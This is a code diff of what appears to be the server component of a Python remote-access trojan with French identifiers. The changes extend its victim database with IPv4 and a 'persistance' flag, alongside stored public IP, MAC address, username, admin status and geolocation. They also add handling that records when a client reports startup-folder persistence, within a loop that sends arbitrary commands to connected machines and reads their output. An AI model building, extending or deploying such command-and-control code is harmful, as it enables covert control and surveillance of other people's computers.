@@ -1,3 +1,4 @@
+#from client import Persistance
 import socket
 import threading
 import time
@@ -55,7 +56,7 @@ class Threads:
         print("Arret du Thread : " + self.thread_name + ", numéro : " + str(self.thread_id))
         _async_raise(self.thread_id, SystemExit)
 
-def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation):
+def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation, ipv4, persistance):
     client = {
     "client_num": client_num,
     "platform": platform,
@@ -66,7 +67,9 @@ def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, archi
     "device": device,
     "username": username,
     "administrator": administrator,
-    "geolocation": geolocation
+    "geolocation": geolocation,
+    "ipv4": ipv4,
+    "persistance": persistance
     }
 
     i = 1
@@ -101,6 +104,49 @@ def DefinirIdConn(macAdress):
     print(data["client_num"])
     fichier.close
     return data["client_num"]
+
+def ReturnInfo(macAdress, info_name):
+    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
+    data = json.load(fichier)
+    print(data[info_name])
+    info = data[info_name]
+    fichier.close
+    return info
+
+def DefinirPersistance(macAdress, value):
+    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
+    data = json.load(fichier)
+    client_num = data["client_num"]
+    platform = data["platform"]
+    public_ip = data["public_ip"]
+    local_ip = data["local_ip"]
+    mac_address = data["mac_address"]
+    architecture = data["architecture"]
+    device = data["device"]
+    username = data["username"]
+    administrator = data["administrator"]
+    geolocation = data["geolocation"]
+    ipv4 = data["ipv4"]
+    persistance = value
+    client = {
+    "client_num": client_num,
+    "platform": platform,
+    "public_ip": public_ip,
+    "local_ip": local_ip,
+    "mac_address": mac_address,
+    "architecture": architecture,
+    "device": device,
+    "username": username,
+    "administrator": administrator,
+    "geolocation": geolocation,
+    "ipv4": ipv4,
+    "persistance": persistance
+    }
+    fichier.close()
+    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "w")
+    fichier.write(json.dumps(client, indent=4))
+    fichier.close()
+    return True
         
 def TestMacAddress(path,extension,macAddress):
     list_dir = []
@@ -145,13 +191,16 @@ def AfficherClients(path):
                 username = data["username"]
                 administrator = data["administrator"]
                 geolocation = data["geolocation"]
+                ipv4 = data["ipv4"]
+                persistance = data["persistance"]
                 file.close()
                 print("\t\tListe clients :")
                 print("\nNumero Client : %s\n\tPlatform : %s\
                 \n\tPublic ip : %s\n\tLocal ip : %s\n\tMac address : %s\n\tArchitecture : %s\
-                \n\tDevice : %s\n\tUsername : %s\n\tAdministrator : %s\n\tGeolocation : %s" \
+                \n\tDevice : %s\n\tUsername : %s\n\tAdministrator : %s\n\tGeolocation : %s\
+                \n\tIpv4 : %s\n\tPersistance : %s" \
                 % (client_num, platform,public_ip, local_ip,mac_address, architecture,\
-                device, username,administrator, client_num,))
+                device, username, administrator, geolocation, ipv4, persistance))
 
 class Server:
 
@@ -205,7 +254,7 @@ class Server:
         if TestMacAddress(pathDb, extDb, mac_address)[0] == False:
             print("Nouveau Client !")
             InscrireClient(id_conn, platform, public_ip, local_ip, mac_address, architecture,\
-             device, username, administrator, geolocation)
+             device, username, administrator, geolocation, ipv4, "OFF")
         else:
             print("Client existe deja, num par defaut : " + str(id_conn))
             id_conn = DefinirIdConn(mac_address)
@@ -236,6 +285,12 @@ class Server:
                                     connection.sendall(str.encode(cmd))
                                     output = connection.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
                                     results, pwd = output.split(self.SEPARATOR)
+                                    if "Persistance via dossier startup activé" in results:
+                                        print("Persistance correctement activé")
+                                        DefinirPersistance(mac_address, "ON")
+                                    if "Persistance via dossier startup déja activé" in results and ReturnInfo(mac_address, "persistance"):
+                                        print("Persistance deja activer mise a jour du fichier client")
+                                        DefinirPersistance(mac_address, "ON")
                                     print(results)
                             #else:
                                 ##print("egale a rien")
@@ -281,7 +336,7 @@ listen_service = s.LaunchThread("Run")
 time.sleep(1)
 s.Prompt()
 listen_service.StopThread()
-StopAllClients()
+#StopAllClients()
 #p.StopThread()
 os._exit(0)
 
